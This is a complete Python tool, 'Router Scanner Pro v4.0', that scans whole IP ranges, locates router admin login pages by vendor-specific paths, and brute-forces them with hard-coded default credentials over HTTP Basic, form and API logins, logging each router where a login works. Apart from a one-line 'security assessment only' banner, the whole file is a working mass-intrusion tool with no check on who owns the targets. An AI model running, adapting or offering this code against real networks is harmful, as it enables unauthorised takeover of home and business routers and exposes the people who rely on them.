#!/usr/bin/env python3
"""
Router Scanner Pro - Professional Network Security Tool
Author: Network Security Engineer
Cross-platform: Windows, Linux, macOS
Live output with hacker theme
Enhanced authentication detection
"""

import os
import sys
import json
import time
import signal
import random
import socket
import argparse
import threading
import re
import base64
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import warnings
warnings.filterwarnings('ignore')

# Cross-platform color support
class Colors:
    if os.name == 'nt':  # Windows
        RED = ''
        GREEN = ''
        YELLOW = ''
        BLUE = ''
        MAGENTA = ''
        CYAN = ''
        WHITE = ''
        BOLD = ''
        END = ''
    else:  # Linux/macOS
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        BOLD = '\033[1m'
        END = '\033[0m'

# Global variables
running = True
stats = {'targets_scanned': 0, 'login_pages_found': 0, 'vulnerable_routers': 0, 'start_time': None}

def signal_handler(sig, frame):
    global running
    print(f"\n{Colors.YELLOW}[!] Stopping scanner safely...{Colors.END}")
    running = False
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════════╗
║                    ROUTER SCANNER PRO - v4.0                                ║
║                    Advanced Authentication Detection                         ║
║                                                                              ║
║  🔍 Multi-Auth Detection  |  🔓 HTTP Basic & Form Testing                 ║
║  🚀 API Endpoint Discovery |  📊 Professional Reporting                    ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Colors.END}
{Colors.YELLOW}                            [!] For Network Security Assessment Only [!]{Colors.END}
{Colors.WHITE}                              Follow the white rabbit... 🐰{Colors.END}
"""
    print(banner)

# Target credentials
TARGET_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "support180"),
    ("support", "support"),
    ("user", "user")
]

# Common ports
COMMON_PORTS = [80, 8080, 443, 8443, 8000, 8081, 8888, 8090, 9000, 9090]

# Extended login paths for different router types
LOGIN_PATHS = [
    # Common paths
    '/', '/admin', '/login', '/login.htm', '/admin.htm', '/index.html',
    # TP-Link specific
    '/userRpm/LoginRpm.htm', '/userRpm/StatusRpm.htm', '/cgi-bin/luci',
    # Huawei specific
    '/html/index.html', '/asp/login.asp', '/login.cgi',
    # ZTE specific
    '/login.gch', '/start.gch', '/getpage.gch',
    # Netgear specific
    '/setup.cgi', '/genie.cgi', '/cgi-bin/',
    # Linksys specific
    '/cgi-bin/webproc', '/cgi-bin/webif',
    # D-Link specific
    '/login.php', '/login.asp', '/cgi-bin/login',
    # ASUS specific
    '/Main_Login.asp', '/Advanced_System_Content.asp',
    # FritzBox specific
    '/cgi-bin/webcm', '/cgi-bin/firmwarecfg',
    # Generic API endpoints
    '/api/login', '/api/auth', '/api/user/login', '/api/admin/login',
    '/rest/login', '/rest/auth', '/rest/user/login',
    '/json/login', '/json/auth', '/json/user/login',
    # Other common paths
    '/manager', '/control', '/config', '/settings', '/system',
    '/dashboard', '/panel', '/console', '/interface'
]

class RouterScannerPro:
    def __init__(self, targets, threads=50, timeout=8):
        self.targets = targets
        self.threads = threads
        self.timeout = timeout
        self.session = self.create_session()
        self.lock = threading.Lock()
        
    def create_session(self):
        session = requests.Session()
        retry_strategy = Retry(total=2, backoff_factor=0.5, status_forcelist=[429, 500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=self.threads, pool_maxsize=self.threads)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        return session
    
    def scan_ports_fast(self, ip):
        open_ports = []
        for port in COMMON_PORTS:
            if not running:
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass
        return open_ports
    
    def detect_authentication_type(self, url):
        """Detect different types of authentication"""
        auth_types = []
        
        try:
            # Test for HTTP Basic Auth
            response = self.session.get(url, timeout=self.timeout, verify=False, allow_redirects=True)
            
            if response.status_code == 401:
                auth_types.append('http_basic')
                print(f"{Colors.BLUE}[*] HTTP Basic Auth detected on {url}{Colors.END}")
                return auth_types, response
            
            # Test for form-based authentication
            content = response.text.lower()
            headers = str(response.headers).lower()
            
            # Check for login forms
            if '<form' in content and ('password' in content or 'username' in content):
                auth_types.append('form_based')
                print(f"{Colors.BLUE}[*] Form-based auth detected on {url}{Colors.END}")
            
            # Check for API endpoints
            if any(keyword in content for keyword in ['api', 'json', 'rest', 'ajax']):
                auth_types.append('api_based')
                print(f"{Colors.BLUE}[*] API-based auth detected on {url}{Colors.END}")
            
            # Check for redirect patterns
            if response.history or 'location' in headers:
                auth_types.append('redirect_based')
                print(f"{Colors.BLUE}[*] Redirect-based auth detected on {url}{Colors.END}")
            
            # Check for JavaScript-based auth
            if 'javascript' in content and ('login' in content or 'auth' in content):
                auth_types.append('js_based')
                print(f"{Colors.BLUE}[*] JavaScript-based auth detected on {url}{Colors.END}")
            
            # Check for cookie-based auth
            if 'set-cookie' in headers or 'session' in content:
                auth_types.append('cookie_based')
                print(f"{Colors.BLUE}[*] Cookie-based auth detected on {url}{Colors.END}")
            
            return auth_types, response
            
        except Exception as e:
            return [], None
    
    def test_http_basic_auth(self, ip, port, path, username, password):
        """Test HTTP Basic Authentication"""
        try:
            url = f"http://{ip}:{port}{path}"
            
            # Create Basic Auth header
            credentials = f"{username}:{password}"
            encoded_credentials = base64.b64encode(credentials.encode()).decode()
            
            headers = {
                'Authorization': f'Basic {encoded_credentials}',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            response = self.session.get(url, headers=headers, timeout=self.timeout, verify=False, allow_redirects=True)
            
            # Check for success (not 401)
            if response.status_code != 401 and response.status_code == 200:
                if len(response.text) > 500:  # Reasonable content length
                    return True, response.url
            
            return False, None
            
        except Exception as e:
            return False, None
    
    def test_form_based_auth(self, ip, port, path, username, password):
        """Test form-based authentication"""
        try:
            url = f"http://{ip}:{port}{path}"
            
            # Try different form field combinations
            form_data_variations = [
                {'username': username, 'password': password},
                {'user': username, 'pass': password},
                {'login': username, 'passwd': password},
                {'admin': username, 'admin': password},
                {'name': username, 'pwd': password},
                {'uname': username, 'pword': password},
                {'loginname': username, 'loginpass': password},
                {'userid': username, 'userpass': password},
                {'account': username, 'passcode': password},
                {'username': username, 'password': password, 'login': 'Login'},
                {'user': username, 'pass': password, 'submit': 'Login'},
                {'username': username, 'password': password, 'action': 'login'},
                {'login': username, 'password': password, 'submit': 'Submit'},
                {'username': username, 'password': password, 'login': 'Sign In'},
                {'user': username, 'pass': password, 'login': 'Log In'}
            ]
            
            for form_data in form_data_variations:
                try:
                    response = self.session.post(url, data=form_data, timeout=self.timeout, verify=False, allow_redirects=True)
                    
                    # Check for success indicators
                    if response.status_code == 200 and len(response.text) > 1000:
                        content = response.text.lower()
                        
                        # Success indicators
                        success_indicators = [
                            'admin', 'management', 'configuration', 'settings',
                            'logout', 'status', 'system', 'wireless', 'network',
                            'dashboard', 'control panel', 'router', 'gateway',
                            'welcome', 'overview', 'summary', 'main menu'
                        ]
                        
                        # Failure indicators
                        failure_indicators = [
                            'invalid', 'incorrect', 'failed', 'error', 'denied',
                            'wrong', 'login', 'authentication', 'access denied',
                            'bad request', 'not found', '404', '400'
                        ]
                        
                        success_count = sum(1 for indicator in success_indicators if indicator in content)
                        failure_count = sum(1 for indicator in failure_indicators if indicator in content)
                        
                        if success_count > failure_count:
                            return True, response.url
                            
                except:
                    continue
            
            return False, None
            
        except Exception as e:
            return False, None
    
    def test_api_based_auth(self, ip, port, path, username, password):
        """Test API-based authentication"""
        try:
            # Try different API endpoints
            api_endpoints = [
                f"http://{ip}:{port}/api/login",
                f"http://{ip}:{port}/api/auth",
                f"http://{ip}:{port}/api/user/login",
                f"http://{ip}:{port}/api/admin/login",
                f"http://{ip}:{port}/rest/login",
                f"http://{ip}:{port}/rest/auth",
                f"http://{ip}:{port}/json/login",
                f"http://{ip}:{port}/json/auth"
            ]
            
            for api_url in api_endpoints:
                try:
                    # Try JSON payload
                    json_data = {
                        'username': username,
                        'password': password,
                        'user': username,
                        'pass': password,
                        'login': username,
                        'passwd': password
                    }
                    
                    headers = {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    }
                    
                    response = self.session.post(api_url, json=json_data, headers=headers, timeout=self.timeout, verify=False, allow_redirects=True)
                    
                    if response.status_code == 200:
                        try:
                            json_response = response.json()
                            if 'success' in str(json_response).lower() or 'token' in str(json_response).lower():
                                return True, api_url
                        except:
                            pass
                    
                    # Try form data
                    form_data = {
                        'username': username,
                        'password': password,
                        'user': username,
                        'pass': password
                    }
                    
                    response = self.session.post(api_url, data=form_data, timeout=self.timeout, verify=False, allow_redirects=True)
                    
                    if response.status_code == 200 and len(response.text) > 100:
                        content = response.text.lower()
                        if 'success' in content or 'token' in content or 'authenticated' in content:
                            return True, api_url
                            
                except:
                    continue
            
            return False, None
            
        except Exception as e:
            return False, None
    
    def test_credentials_comprehensive(self, ip, port, path, username, password, auth_types):
        """Test credentials using all detected authentication types"""
        for auth_type in auth_types:
            if auth_type == 'http_basic':
                success, admin_url = self.test_http_basic_auth(ip, port, path, username, password)
                if success:
                    return True, admin_url, 'HTTP Basic Auth'
            
            elif auth_type == 'form_based':
                success, admin_url = self.test_form_based_auth(ip, port, path, username, password)
                if success:
                    return True, admin_url, 'Form-based Auth'
            
            elif auth_type == 'api_based':
                success, admin_url = self.test_api_based_auth(ip, port, path, username, password)
                if success:
                    return True, admin_url, 'API-based Auth'
            
            # For other types, try form-based as fallback
            else:
                success, admin_url = self.test_form_based_auth(ip, port, path, username, password)
                if success:
                    return True, admin_url, f'{auth_type} (Form fallback)'
        
        return False, None, None
    
    def scan_single_target(self, ip):
        result = {'ip': ip, 'ports': [], 'login_pages': [], 'vulnerabilities': []}
        
        try:
            # Phase 1: Port scanning
            print(f"{Colors.CYAN}[*] Scanning ports on {ip}...{Colors.END}")
            open_ports = self.scan_ports_fast(ip)
            result['ports'] = open_ports
            
            if not open_ports:
                print(f"{Colors.YELLOW}[!] {ip}: No open ports found{Colors.END}")
                return result
            
            print(f"{Colors.GREEN}[+] {ip}: Found {len(open_ports)} open ports: {open_ports}{Colors.END}")
            
            # Phase 2: Enhanced login page detection
            for port in open_ports:
                if not running:
                    break
                
                for path in LOGIN_PATHS:
                    if not running:
                        break
                    
                    url = f"http://{ip}:{port}{path}"
                    print(f"{Colors.YELLOW}[*] Testing {url} for authentication...{Colors.END}")
                    
                    auth_types, response = self.detect_authentication_type(url)
                    
                    if auth_types:
                        print(f"{Colors.GREEN}[+] AUTHENTICATION FOUND: {url} - Types: {', '.join(auth_types)}{Colors.END}")
                        
                        login_info = {
                            'url': url, 
                            'port': port, 
                            'path': path, 
                            'auth_types': auth_types
                        }
                        result['login_pages'].append(login_info)
                        
                        # Phase 3: Enhanced brute force
                        print(f"{Colors.MAGENTA}[*] Starting comprehensive brute force on {url}...{Colors.END}")
                        
                        for username, password in TARGET_CREDENTIALS:
                            if not running:
                                break
                            
                            print(f"{Colors.CYAN}[>] Testing: {username}:{password}{Colors.END}")
                            
                            success, admin_url, auth_method = self.test_credentials_comprehensive(
                                ip, port, path, username, password, auth_types
                            )
                            
                            if success:
                                print(f"{Colors.RED}🔒 VULNERABLE: {ip} - {username}:{password} works! ({auth_method}){Colors.END}")
                                print(f"{Colors.GREEN}[+] Admin URL: {admin_url}{Colors.END}")
                                
                                vulnerability = {
                                    'type': 'Default Credentials',
                                    'credentials': f"{username}:{password}",
                                    'admin_url': admin_url,
                                    'auth_method': auth_method
                                }
                                result['vulnerabilities'].append(vulnerability)
                                
                                with self.lock:
                                    stats['vulnerable_routers'] += 1
                                
                                break
                            else:
                                print(f"{Colors.YELLOW}[-] {username}:{password} failed{Colors.END}")
                        
                        if not result['vulnerabilities']:
                            print(f"{Colors.RED}[-] No valid credentials found{Colors.END}")
            
            # Update stats
            with self.lock:
                stats['targets_scanned'] += 1
                if result['login_pages']:
                    stats['login_pages_found'] += 1
            
            return result
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error scanning {ip}: {e}{Colors.END}")
            return result
    
    def run_scan(self):
        print(f"{Colors.GREEN}[+] Starting enhanced scan of {len(self.targets)} targets with {self.threads} threads{Colors.END}")
        print(f"{Colors.YELLOW}[*] Target credentials: {', '.join([f'{u}:{p}' for u, p in TARGET_CREDENTIALS])}{Colors.END}")
        print(f"{Colors.CYAN}[*] Scanning ports: {', '.join(map(str, COMMON_PORTS))}{Colors.END}")
        print(f"{Colors.BLUE}[*] Authentication types: HTTP Basic, Form-based, API-based, Redirect-based{Colors.END}")
        print(f"{Colors.MAGENTA}[*] Login paths: {len(LOGIN_PATHS)} different paths tested{Colors.END}")
        print("-" * 80)
        
        all_results = []
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_ip = {executor.submit(self.scan_single_target, ip): ip for ip in self.targets}
            
            for future in as_completed(future_to_ip):
                if not running:
                    break
                
                ip = future_to_ip[future]
                try:
                    result = future.result()
                    if result:
                        all_results.append(result)
                        
                        completed = len(all_results)
                        progress = (completed / len(self.targets)) * 100
                        
                        print(f"{Colors.MAGENTA}[*] Progress: {completed}/{len(self.targets)} ({progress:.1f}%) - "
                              f"Login pages: {stats['login_pages_found']}, Vulnerable: {stats['vulnerable_routers']}{Colors.END}")
                        
                except Exception as exc:
                    print(f"{Colors.RED}[!] {ip} generated an exception: {exc}{Colors.END}")
        
        return all_results

def parse_targets(target_input):
    targets = []
    
    if '/' in target_input:  # CIDR
        import ipaddress
        network = ipaddress.IPv4Network(target_input, strict=False)
        targets = [str(ip) for ip in network.hosts()]
    elif '-' in target_input:  # IP range
        start_ip, end_ip = target_input.split('-')
        start = list(map(int, start_ip.split('.')))
        end = list(map(int, end_ip.split('.')))
        
        for a in range(start[0], end[0] + 1):
            for b in range(start[1], end[1] + 1):
                for c in range(start[2], end[2] + 1):
                    for d in range(start[3], end[3] + 1):
                        targets.append(f"{a}.{b}.{c}.{d}")
    elif target_input.endswith('.txt'):  # File
        try:
            with open(target_input, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Colors.RED}[!] File not found: {target_input}{Colors.END}")
            return []
    else:  # Single IP
        targets = [target_input]
    
    return targets

def main():
    parser = argparse.ArgumentParser(description="Router Scanner Pro v4.0 - Advanced Authentication Detection")
    parser.add_argument('-t', '--targets', required=True, help='Target IP(s): single IP, CIDR, range, or file')
    parser.add_argument('-T', '--threads', type=int, default=50, help='Number of threads (default: 50)')
    parser.add_argument('--timeout', type=int, default=8, help='Request timeout in seconds (default: 8)')
    
    args = parser.parse_args()
    
    clear_screen()
    print_banner()
    
    targets = parse_targets(args.targets)
    if not targets:
        print(f"{Colors.RED}[!] No valid targets found{Colors.END}")
        return
    
    print(f"{Colors.GREEN}[+] Loaded {len(targets)} targets{Colors.END}")
    
    scanner = RouterScannerPro(targets, args.threads, args.timeout)
    stats['start_time'] = time.time()
    
    try:
        results = scanner.run_scan()
        
        if results:
            total_time = time.time() - stats['start_time']
            
            print(f"\n{Colors.GREEN}[+] Enhanced Scan Complete!{Colors.END}")
            print(f"{Colors.YELLOW}[*] Summary:{Colors.END}")
            print(f"  - Total targets scanned: {len(results)}")
            print(f"  - Login pages found: {stats['login_pages_found']}")
            print(f"  - Vulnerable routers: {stats['vulnerable_routers']}")
            print(f"  - Scan duration: {total_time:.1f} seconds")
            print(f"  - Average speed: {len(results)/total_time:.1f} targets/second")
            print(f"{Colors.BLUE}[*] Multiple authentication types tested{Colors.END}")
            
        else:
            print(f"{Colors.RED}[!] No results to report{Colors.END}")
            
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Scan interrupted by user{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error during scan: {e}{Colors.END}")

if __name__ == "__main__":
    main()